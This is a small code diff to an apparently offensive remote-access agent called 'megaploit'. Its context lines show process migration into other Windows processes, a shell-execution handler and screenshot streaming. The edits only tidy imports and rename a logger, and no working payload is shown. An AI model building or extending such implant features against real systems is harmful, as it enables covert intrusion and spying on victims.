@@ -39,10 +39,10 @@ import sys
 import threading
 import time
 import types
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 
 from megaploit.agent.handlers import _register, _shell_exec, get_send_lock, _handlers_lock  # shared registry
-from megaploit.core.protocol import send_msg as _send_msg, send_file as _send_file, recv_msg as _recv_msg
+from megaploit.core.protocol import send_msg as _send_msg, recv_msg as _recv_msg
 
 
 # ---------------------------------------------------------------------------
@@ -142,8 +142,8 @@ def _migrate_windows(pid: int) -> str:
             # Target process does not have Python loaded; fall through to
             # detached-subprocess fallback.  Log the reason so it is visible
             # in debug output rather than being silently discarded.
-            import logging as _log
-            _log.getLogger(__name__).debug("migrate PyRun_SimpleString skipped: %s", _inner_exc)
+            import logging as _mlog
+            _mlog.getLogger(__name__).debug("migrate PyRun_SimpleString skipped: %s", _inner_exc)
 
         # Fallback: spawn detached python.exe re-running the agent.
         # Free the remote memory allocation before closing the process handle
@@ -559,7 +559,6 @@ def _screenshot_stream_burst(conn, args: list[str]) -> str | None:
         # Fallback: pyautogui
         try:
             import pyautogui
-            from PIL import Image
             quality = 70
             unacked: list = []
             for i in range(count):
